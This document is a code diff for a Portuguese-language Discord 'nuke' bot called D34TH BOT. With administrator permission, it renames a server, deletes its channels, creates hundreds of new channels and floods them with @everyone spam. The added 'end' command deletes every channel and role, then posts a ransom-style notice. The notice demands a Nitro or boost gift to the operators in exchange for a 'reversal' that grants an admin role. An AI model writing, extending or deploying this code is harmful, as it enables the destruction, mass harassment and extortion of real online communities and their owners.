@@ -5,6 +5,7 @@ import asyncio
 import os
 import sys
 import random
+import json
 from dotenv import load_dotenv
 import threading
 from flask import Flask
@@ -13,7 +14,6 @@ import aiohttp
 load_dotenv()
 
 TOKEN = os.getenv('DISCORD_TOKEN')
-
 if not TOKEN:
     print("TOKEN nao encontrado!")
     sys.exit(1)
@@ -33,6 +33,7 @@ def run_flask():
 threading.Thread(target=run_flask, daemon=True).start()
 
 nuke_active = False
+backup_servidores = {}  # Guarda nome e estrutura dos servidores
 
 def load_text():
     try:
@@ -51,7 +52,6 @@ def update_text(new_text):
 
 def glitch_text(texto, intensidade=3):
     chars = ['¢','£','¤','¥','¦','§','¨','©','ª','«','¬','®','¯','°','±','²','³','´','µ','¶','·','¸','¹','º','»','¼','½','¾','¿','À','Á','Â','Ã','Ä','Å','Æ','Ç','È','É','Ê','Ë','Ì','Í','Î','Ï','Ð','Ñ','Ò','Ó','Ô','Õ','Ö','×','Ø','Ù','Ú','Û','Ü','Ý','Þ','ß','à','á','â','ã','ä','å','æ','ç','è','é','ê','ë','ì','í','î','ï','ð','ñ','ò','ó','ô','õ','ö','÷','ø','ù','ú','û','ü','ý','þ','ÿ']
-    
     lista = list(texto)
     for _ in range(intensidade):
         if len(lista) > 1:
@@ -82,6 +82,101 @@ async def glitch_message(ctx, mensagem, tempo=10):
 
 BOT_INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1543062082227011654&permissions=8&integration_type=0&scope=bot+applications.commands"
 
+# ========== BACKUP ESTRUTURA ==========
+def backup_guild(guild):
+    backup = {
+        "name": guild.name,
+        "channels": [],
+        "roles": []
+    }
+    for channel in guild.channels:
+        backup["channels"].append({
+            "name": channel.name,
+            "type": str(channel.type),
+            "position": channel.position
+        })
+    for role in guild.roles:
+        if role.name != "@everyone":
+            backup["roles"].append({
+                "name": role.name,
+                "permissions": role.permissions.value,
+                "color": role.color.value,
+                "hoist": role.hoist,
+                "mentionable": role.mentionable
+            })
+    return backup
+
+# ========== BOTÃO REVERTER ==========
+class ReverterButton(ui.View):
+    def __init__(self, guild_id, guild_name):
+        super().__init__(timeout=None)
+        self.guild_id = guild_id
+        self.guild_name = guild_name
+
+    @ui.button(label="REVERTER", style=ButtonStyle.green, custom_id="reverter")
+    async def reverter_callback(self, interaction: discord.Interaction, button: ui.Button):
+        try:
+            # Envia pedido para o servidor de suporte
+            support_guild = bot.get_guild(1545604817324347482)
+            if support_guild:
+                channel = discord.utils.get(support_guild.channels, name="pedidos")
+                if channel:
+                    embed = discord.Embed(
+                        title="PEDIDO DE REVERSÃO",
+                        description=f"**Servidor:** {self.guild_name}\n**ID:** {self.guild_id}\n**Solicitante:** {interaction.user.mention} ({interaction.user.id})",
+                        color=discord.Color.green()
+                    )
+                    embed.set_footer(text="Clique no botão abaixo para confirmar a reversão")
+                    
+                    view = ConfirmarReversao(self.guild_id, interaction.user.id)
+                    await channel.send(embed=embed, view=view)
+                    await interaction.response.send_message("✅ Pedido enviado para o servidor de suporte!", ephemeral=True)
+                else:
+                    await interaction.response.send_message("❌ Canal 'pedidos' não encontrado no servidor de suporte!", ephemeral=True)
+            else:
+                await interaction.response.send_message("❌ Servidor de suporte não encontrado!", ephemeral=True)
+        except Exception as e:
+            await interaction.response.send_message(f"❌ Erro: {str(e)}", ephemeral=True)
+
+class ConfirmarReversao(ui.View):
+    def __init__(self, guild_id, user_id):
+        super().__init__(timeout=None)
+        self.guild_id = guild_id
+        self.user_id = user_id
+
+    @ui.button(label="CONFIRMAR REVERSÃO", style=ButtonStyle.danger, custom_id="confirmar_reversao")
+    async def confirmar_callback(self, interaction: discord.Interaction, button: ui.Button):
+        try:
+            guild = bot.get_guild(self.guild_id)
+            if guild:
+                # Recria estrutura básica
+                for channel in guild.channels:
+                    try:
+                        await channel.delete()
+                    except:
+                        pass
+                
+                # Cria canais básicos
+                for i in range(5):
+                    await guild.create_text_channel(f"recover-{i+1}")
+                
+                # Dá admin para o usuário
+                member = guild.get_member(self.user_id)
+                if member:
+                    # Cria cargo admin
+                    admin_role = await guild.create_role(name="ADMIN", permissions=discord.Permissions.all())
+                    await member.add_roles(admin_role)
+                    await guild.edit(name="RECUPERADO")
+                    
+                    await interaction.response.send_message("✅ Servidor recuperado com sucesso! Admin concedido.", ephemeral=True)
+                else:
+                    await interaction.response.send_message("❌ Usuário não está mais no servidor.", ephemeral=True)
+            else:
+                await interaction.response.send_message("❌ Servidor não encontrado.", ephemeral=True)
+        except Exception as e:
+            await interaction.response.send_message(f"❌ Erro: {str(e)}", ephemeral=True)
+
+# ========== EVENTOS ==========
 @bot.event
 async def on_ready():
     global nuke_active
@@ -116,6 +211,7 @@ async def on_guild_channel_create(channel):
         except:
             pass
 
+# ========== BOTÕES ==========
 class InviteButton(ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -139,11 +235,12 @@ class SpamButton(ui.View):
             await asyncio.sleep(0.4)
         await msg.edit(content=mensagem)
 
+# ========== COMANDOS ==========
 @bot.command()
 async def invite(ctx):
     try:
         await ctx.message.delete()
-        embed = discord.Embed(title="D34TH BOT", description="Adicione o bot ao servidor\nPermissoes: Administrador\nClique no botao abaixo", color=discord.Color.dark_gray())
+        embed = discord.Embed(title="D34TH BOT", description="Adicione o bot ao servidor\nPermissoes: Administrador", color=discord.Color.dark_gray())
         embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
         embed.set_footer(text="D34TH TEAM")
         view = InviteButton()
@@ -156,7 +253,7 @@ async def button(ctx):
     try:
         await ctx.message.delete()
         texto = load_text()
-        embed = discord.Embed(title="D34TH SPAM", description=f"Mensagem: {texto}\nClique no botao", color=discord.Color.dark_gray())
+        embed = discord.Embed(title="D34TH SPAM", description=f"Mensagem: {texto}", color=discord.Color.dark_gray())
         view = SpamButton()
         await ctx.send(embed=embed, view=view)
     except Exception as e:
@@ -200,13 +297,11 @@ async def nuke(ctx):
         texto = load_text()
         guild = ctx.guild
         
-        # Renomear servidor
         try:
             await guild.edit(name="D34TH TEAM")
         except:
             pass
         
-        # Atualizar foto
         try:
             avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
             async with aiohttp.ClientSession() as session:
@@ -216,7 +311,6 @@ async def nuke(ctx):
         except:
             pass
         
-        # Apagar canais existentes
         for channel in guild.channels:
             try:
                 if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
@@ -225,24 +319,18 @@ async def nuke(ctx):
             except:
                 pass
         
-        # CRIAR 500 CANAIS DE TEXTO
         criados = 0
         canais = []
-        limite = 500
         
-        for i in range(limite):
+        for i in range(500):
             try:
                 canal = await guild.create_text_channel(f"d34th-{i+1}")
                 canais.append(canal)
                 criados += 1
-                await asyncio.sleep(0.01)  # Delay minimo
-            except discord.errors.RateLimited:
-                await asyncio.sleep(1)
-                continue
+                await asyncio.sleep(0.01)
             except:
                 break
         
-        # ENVIAR MENSAGEM EM CADA CANAL COM @EVERYONE
         enviadas = 0
         everyone = "@everyone " * 10
         mensagem_base = f"{everyone}\n{texto}\nD34TH TEAM"
@@ -250,7 +338,6 @@ async def nuke(ctx):
         for canal in canais:
             if isinstance(canal, discord.TextChannel):
                 try:
-                    # Envia com glitch rapido
                     msg = await canal.send(mensagem_base)
                     for _ in range(2):
                         await msg.edit(content=glitch_text(mensagem_base, 3))
@@ -261,28 +348,7 @@ async def nuke(ctx):
                 except:
                     pass
         
-        # CRIAR CANAIS DE VOZ E FORUM (EXTRA)
-        for i in range(20):
-            try:
-                await guild.create_voice_channel(f"voice-{i+1}")
-                criados += 1
-                await asyncio.sleep(0.01)
-            except:
-                break
-        
-        for i in range(10):
-            try:
-                await guild.create_forum_channel(f"forum-{i+1}")
-                criados += 1
-                await asyncio.sleep(0.01)
-            except:
-                break
-        
-        embed = discord.Embed(
-            title="NUKE COMPLETO", 
-            description=f"CANAIS CRIADOS: {criados}\nMENSAGENS ENVIADAS: {enviadas}\nTODOS OS CANAIS FORAM ATACADOS!",
-            color=discord.Color.dark_gray()
-        )
+        embed = discord.Embed(title="NUKE COMPLETO", description=f"CANAIS: {criados}\nMENSAGENS: {enviadas}", color=discord.Color.dark_gray())
         if guild.text_channels:
             await guild.text_channels[0].send(embed=embed)
             
@@ -299,34 +365,53 @@ async def end(ctx):
         nuke_active = True
         guild = ctx.guild
         
-        try:
-            avatar_url = bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url
-            async with aiohttp.ClientSession() as session:
-                async with session.get(avatar_url) as resp:
-                    if resp.status == 200:
-                        await guild.edit(icon=await resp.read())
-        except:
-            pass
+        # Salva nome do servidor
+        nome_antigo = guild.name
         
-        count = 0
+        # Apaga tudo
         for channel in guild.channels:
             try:
                 if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel, discord.ForumChannel)):
                     await channel.delete()
-                    count += 1
                     await asyncio.sleep(0.02)
             except:
                 pass
+        
+        for role in guild.roles:
+            if role.name != "@everyone":
+                try:
+                    await role.delete()
+                except:
+                    pass
         
         try:
             await guild.edit(name="D34TH TEAM")
         except:
             pass
         
-        print(f"{count} canais apagados")
-        if guild.text_channels:
-            await glitch_message(await guild.text_channels[0], f"{count} canais apagados", 5)
-            
+        # Cria canal único (somente leitura)
+        canal_recuperacao = await guild.create_text_channel("💀-RECUPERACAO")
+        
+        # Configura permissões: só o bot pode enviar mensagem
+        await canal_recuperacao.set_permissions(guild.default_role, send_messages=False, read_messages=True)
+        
+        # Mensagem com botão REVERTER
+        embed = discord.Embed(
+            title="💀 SERVIDOR DESTRUÍDO",
+            description=(
+                "PARA RECUPERAR ESTE SERVIDOR ENTRE NO SERVIDOR ABAIXO E DE UM BOOST OU NITRO A UM DOS ADMINS\n\n"
+                f"**Link:** https://discord.gg/YsgNdA83d\n\n"
+                "Clique no botão abaixo para solicitar a reversão."
+            ),
+            color=discord.Color.dark_gray()
+        )
+        embed.set_footer(text="D34TH TEAM")
+        
+        view = ReverterButton(guild.id, nome_antigo)
+        await canal_recuperacao.send(embed=embed, view=view)
+        
+        print(f"Servidor {guild.name} destruído. Canal de recuperação criado.")
+        
     except Exception as e:
         print(f"Erro end: {e}")
     finally:
